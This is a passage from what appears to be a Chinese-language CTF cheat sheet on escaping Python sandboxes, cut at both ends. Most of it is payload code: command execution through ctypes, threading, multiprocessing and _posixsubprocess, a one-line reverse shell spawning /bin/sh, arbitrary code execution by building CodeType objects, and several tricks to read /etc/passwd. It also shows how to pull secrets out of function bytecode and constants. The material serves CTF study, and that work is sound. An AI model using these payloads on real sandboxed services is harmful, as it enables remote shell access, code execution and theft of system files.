class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="literal">None</span>)</span><br><span class="line">libc.system(<span class="string">&#x27;ls ./&#x27;</span>.encode())  <span class="comment"># 使用 encode() 方法将字符串转换为字节字符串</span></span><br></pre></td></tr></table></figure><p>in sandbox</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br></pre></td></tr></table></figure><h4 id="threading"><a href="#threading" class="headerlink" title="threading"></a><code>threading</code></h4><p>using new thread to execute command</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ls&#x27;</span>)  <span class="comment"># 在新的线程中执行命令</span></span><br><span class="line"></span><br><span class="line">t = threading.Thread(target=func)  <span class="comment"># 创建一个新的线程</span></span><br><span class="line">t.start()  <span class="comment"># 开始执行新的线程</span></span><br></pre></td></tr></table></figure><p>in one line:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eval, exec 都可以执行的版本</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>).Thread(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># exec 可执行</span></span><br><span class="line"><span class="keyword">import</span> threading, os; threading.Thread(target=<span class="keyword">lambda</span>: os.system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br></pre></td></tr></table></figure><h4 id="multprocessing"><a href="#multprocessing" class="headerlink" title="multprocessing"></a><code>multprocessing</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = multiprocessing.Process(target=func)</span><br><span class="line">p.start()</span><br></pre></td></tr></table></figure><p>in one line:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br></pre></td></tr></table></figure><h4 id="posixsubprocess"><a href="#posixsubprocess" class="headerlink" title="_posixsubprocess"></a><code>_posixsubprocess</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>结合 <strong>loader</strong>.load_module(fullname) 导入模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>in one line</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).socket(<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).AF_INET,<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));[<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).dup2(s.fileno(),i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)];<span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="构造代码对象进行-RCE"><a href="#构造代码对象进行-RCE" class="headerlink" title="构造代码对象进行 RCE"></a>构造代码对象进行 RCE</h4><p><code>CodeType</code> 是 python 的内置类型之一，用于表示编译后的字节码对象。<code>odeType</code> 对象包含了函数、方法或模块的字节码指令序列以及与之相关的属性。</p><p>CodeType 对象具有以下属性：</p><ul><li>co_argcount: 函数的参数数量，不包括可变参数和关键字参数。</li><li>co_cellvars: 函数内部使用的闭包变量的名称列表。</li><li>co_code: 函数的字节码指令序列，以二进制形式表示。</li><li>co_consts: 函数中使用的常量的元组，包括整数、浮点数、字符串等。</li><li>co_exceptiontable: 异常处理表，用于描述函数中的异常处理。</li><li>co_filename: 函数所在的文件名。</li><li>co_firstlineno: 函数定义的第一行所在的行号。</li><li>co_flags: 函数的标志位，表示函数的属性和特征，如是否有默认参数、是否是生成器函数等。</li><li>co_freevars: 函数中使用的自由变量的名称列表，自由变量是在函数外部定义但在函数内部被引用的变量。</li><li>co_kwonlyargcount: 函数的关键字参数数量。</li><li>co_lines: 函数的源代码行列表。</li><li>co_linetable: 函数的行号和字节码指令索引之间的映射表。</li><li>co_lnotab: 表示行号和字节码指令索引之间的映射关系的字符串。</li><li>co_name: 函数的名称。</li><li>co_names: 函数中使用的全局变量的名称列表。</li><li>co_nlocals: 函数中局部变量的数量。</li><li>co_positions: 函数中与位置相关的变量（比如闭包中的自由变量）的名称列表。</li><li>co_posonlyargcount: 函数的仅位置参数数量。</li><li>co_qualname: 函数的限定名称，包含了函数所在的模块和类名。</li><li>co_stacksize: 函数的堆栈大小，表示函数执行时所需的堆栈空间。</li><li>co_varnames: 函数中局部变量的名称列表。</li></ul><p>假设存在如下的一个函数.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">some_input</span>):</span><br><span class="line">    var1=<span class="number">1</span></span><br><span class="line">    var2=<span class="string">&quot;secretcode&quot;</span></span><br><span class="line">    var3=[<span class="string">&quot;some&quot;</span>,<span class="string">&quot;array&quot;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc_flag</span>(<span class="params">flag_rot2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c)-<span class="number">2</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag_rot2)</span><br><span class="line">    <span class="keyword">if</span> some_input == var2:</span><br><span class="line">        <span class="keyword">return</span> calc_flag(<span class="string">&quot;VjkuKuVjgHnci&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope&quot;</span></span><br></pre></td></tr></table></figure><p>我们可以通过 <code>get_flag.__code__</code> 获取其代码对象. 代码对象包含了关于代码的所有信息, 例如 co_code 属性存储了字节码信息, 因此修改这个字节码就可以达到修改函数执行的目的, 但需要注意的是，python 可以将某个函数的 <code>__code__</code> 对象整个进行修改。仅仅修改其中的子属性是不行的。如下所示, python 会抛出异常.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_code</span><br><span class="line"><span class="string">b&#x27;\x97\x00d\x01&#125;\x01d\x02&#125;\x02d\x03d\x04g\x02&#125;\x03d\x05\x84\x00&#125;\x04|\x00|\x02k\x02\x00\x00\x00\x00r\x0b\x02\x00|\x04d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00d\x07S\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_code = <span class="number">1</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: attribute <span class="string">&#x27;co_code&#x27;</span> of <span class="string">&#x27;code&#x27;</span> objects <span class="keyword">is</span> <span class="keyword">not</span> writable</span><br></pre></td></tr></table></figure><p>这种情况下,我们需要构造一个新的代码对象并主动执行.具体步骤如下：</p><ol><li><p>第一步，本地构造 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br></pre></td></tr></table></figure></li><li><p>获取创建代码对象所需的参数, 通过 <code>help</code> 或者 <code>__doc__</code> 属性进行获取, 不同的版本有所差异， 我在本地测试时版本为 python 3.11.2，此时 code 需要传入 17 个参数，且不支持关键字传递。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&gt; <span class="keyword">import</span> types</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">help</span>(types.CodeType)</span><br><span class="line">code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars=(), cellvars=(), /)</span><br></pre></td></tr></table></figure></li><li><p>参数赋值。获取到所需的参数之后，我们可以将这些参数先保存在变量中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">code = read.__code__</span><br><span class="line"></span><br><span class="line">argcount = code.co_argcount</span><br><span class="line">posonlyargcount = code.co_posonlyargcount</span><br><span class="line">kwonlyargcount = code.co_kwonlyargcount</span><br><span class="line">nlocals = code.co_nlocals</span><br><span class="line">stacksize = code.co_stacksize</span><br><span class="line">flags = code.co_flags</span><br><span class="line">codestring = code.co_code</span><br><span class="line">constants = code.co_consts</span><br><span class="line">names = code.co_names</span><br><span class="line">varnames = code.co_varnames</span><br><span class="line">filename = code.co_filename</span><br><span class="line">name = code.co_name</span><br><span class="line">qualname = code.co_qualname</span><br><span class="line">firstlineno = code.co_firstlineno</span><br><span class="line">linetable = code.co_linetable</span><br><span class="line">exceptiontable = code.co_exceptiontable</span><br><span class="line">freevars = code.co_freevars</span><br><span class="line">cellvars = code.co_cellvars</span><br></pre></td></tr></table></figure></li><li><p>创建代码对象。创建代码对象需要调用 <code>types.CodeType</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line">codeobj = types.CodeType(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars, cellvars)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code_type = <span class="built_in">type</span>((<span class="keyword">lambda</span>: <span class="literal">None</span>).__code__)</span><br></pre></td></tr></table></figure></li><li><p>调用函数。从代码对象进行调用需要创建一个函数对象, 获取这个类可以使用 <code>type</code> 函数，或者直接 <code>import</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function_type = <span class="built_in">type</span>(<span class="keyword">lambda</span>: <span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>创建函数对象所需的参数如下，可以通过 help 函数查看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function(code, <span class="built_in">globals</span>, name=<span class="literal">None</span>, argdefs=<span class="literal">None</span>, closure=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mydict = &#123;&#125;</span><br><span class="line">mydict[<span class="string">&#x27;__builtins__&#x27;</span>] = __builtins__</span><br><span class="line">function_type(codeobj, mydict, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>)()</span><br></pre></td></tr></table></figure></li><li><p>调用函数也可以直接使用 <code>eval</code> 或者<code> exec</code></p></li></ol><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h4 id="file"><a href="#file" class="headerlink" title="file"></a><code>file</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br><span class="line"><span class="comment">#注意：该函数只存在于Python2，Python3不存在</span></span><br></pre></td></tr></table></figure><h4 id="open"><a href="#open" class="headerlink" title="open"></a><code>open</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="codecs"><a href="#codecs" class="headerlink" title="codecs"></a><code>codecs</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="get-data"><a href="#get-data" class="headerlink" title="get_data"></a><code>get_data</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _frozen_importlib_external.FileLoader.get_data(0,&lt;filename&gt;)</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">91</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)</span><br></pre></td></tr></table></figure><p>相比于获取 <code>__builtins__</code> 再使用 <code>open</code> 去进行读取,使用 <code>get_data</code> 的 payload 更短.</p><h4 id="linecache-getlines"><a href="#linecache-getlines" class="headerlink" title="linecache.getlines"></a><code>linecache.getlines</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> linecache</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>linecache.getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="lisense"><a href="#lisense" class="headerlink" title="lisense"></a><code>lisense</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="枚举目录"><a href="#枚举目录" class="headerlink" title="枚举目录"></a>枚举目录</h3><h4 id="os-listdir"><a href="#os-listdir" class="headerlink" title="os.listdir"></a><code>os.listdir</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="glob"><a href="#glob" class="headerlink" title="glob"></a><code>glob</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">glob.glob(<span class="string">&quot;f*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;glob&#x27;</span>).glob(<span class="string">&quot;f*&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="获取函数信息"><a href="#获取函数信息" class="headerlink" title="获取函数信息"></a>获取函数信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">some_input</span>):</span><br><span class="line">    var1=<span class="number">1</span></span><br><span class="line">    var2=<span class="string">&quot;secretcode&quot;</span></span><br><span class="line">    var3=[<span class="string">&quot;some&quot;</span>,<span class="string">&quot;array&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> some_input == var2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;THIS-IS-THE-FALG!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope&quot;</span></span><br></pre></td></tr></table></figure><h4 id="获取源代码中的常量"><a href="#获取源代码中的常量" class="headerlink" title="获取源代码中的常量"></a>获取源代码中的常量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_consts</span><br><span class="line">(<span class="literal">None</span>, <span class="number">1</span>, <span class="string">&#x27;secretcode&#x27;</span>, <span class="string">&#x27;some&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;THIS-IS-THE-FALG!&#x27;</span>, <span class="string">&#x27;Nope&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="获取源代码中的变量"><a href="#获取源代码中的变量" class="headerlink" title="获取源代码中的变量"></a>获取源代码中的变量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__globals__</span><br><span class="line"></span><br><span class="line">get_flag.__globals__</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_varnames</span><br><span class="line">(<span class="string">&#x27;some_input&#x27;</span>, <span class="string">&#x27;var1&#x27;</span>, <span class="string">&#x27;var2&#x27;</span>, <span class="string">&#x27;var3&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="字节码序列"><a href="#字节码序列" class="headerlink" title="字节码序列"></a>字节码序列</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_code</span><br><span class="line"><span class="string">b&#x27;\x97\x00d\x01&#125;\x01d\x02&#125;\x02d\x03d\x04g\x02&#125;\x03|\x00|\x02k\x02\x00\x00\x00\x00r\x02d\x05S\x00d\x06S\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>using dis module</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytecode = get_flag.__code__.co_code</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(bytecode)</span><br><span class="line">          <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line">          <span class="number">2</span> LOAD_CONST               <span class="number">1</span></span><br><span class="line">          <span class="number">4</span> STORE_FAST               <span class="number">1</span></span><br><span class="line">          <span class="number">6</span> LOAD_CONST               <span class="number">2</span></span><br><span class="line">          <span class="number">8</span> STORE_FAST               <span class="number">2</span></span><br><span class="line">         <span class="number">10</span> LOAD_CONST               <span class="number">3</span></span><br><span class="line">         <span class="number">12</span> LOAD_CONST               <span class="number">4</span></span><br><span class="line">         <span class="number">14</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">         <span class="number">16</span> STORE_FAST               <span class="number">3</span></span><br><span class="line">         <span class="number">18</span> LOAD_FAST                <span class="number">0</span></span><br><span class="line">         <span class="number">20</span> LOAD_FAST                <span class="number">2</span></span><br><span class="line">         <span class="number">22</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">         <span class="number">28</span> POP_JUMP_FORWARD_IF_FALSE     <span class="number">2</span> (to <span class="number">34</span>)</span><br><span class="line">         <span class="number">30</span> LOAD_CONST               <span class="number">5</span></span><br><span class="line">         <span class="number">32</span> RETURN_VALUE</span><br><span class="line">    &gt;&gt;   <span class="number">34</span> LOAD_CONST               <span class="number">6</span></span><br><span class="line">         <span class="number">36</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>通过 <code>dis.disassemble</code> 获取更清晰的表示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytecode = get_flag.__code__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble(bytecode)</span><br><span class="line">  <span class="number">1</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="number">2</span>           <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line">              <span class="number">4</span> STORE_FAST               <span class="number">1</span> (var1)</span><br><span class="line"></span><br><span class="line">  <span class="number">3</span>           <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;secretcode&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> STORE_FAST               <span class="number">2</span> (var2)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">10</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;some&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;array&#x27;</span>)</span><br><span class="line">             <span class="number">14</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">16</span> STORE_FAST               <span class="number">3</span> (var3)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">18</span> LOAD_FAST                <span class="number">0</span> (some_input)</span><br><span class="line">             <span class="number">20</span> LOAD_FAST                <span class="number">2</span> (var2)</span><br><span class="line">             <span class="number">22</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">             <span class="number">28</span> POP_JUMP_FORWARD_IF_FALSE     <span class="number">2</span> (to <span class="number">34</span>)</span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">30</span> LOAD_CONST               <span class="number">5</span> (<span class="string">&#x27;THIS-IS-THE-FALG!&#x27;</span>)</span><br><span class="line">             <span class="number">32</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>     &gt;&gt;   <span class="number">34</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;Nope&#x27;</span>)</span><br><span class="line">             <span class="number">36</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><h3 id="获取环境信息"><a href="#获取环境信息" class="headerlink" title="获取环境信息"></a>获取环境信息</h3><h4 id="获取-python-版本"><a href="#获取-python-版本" class="headerlink" title="获取 python 版本"></a>获取 python 版本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 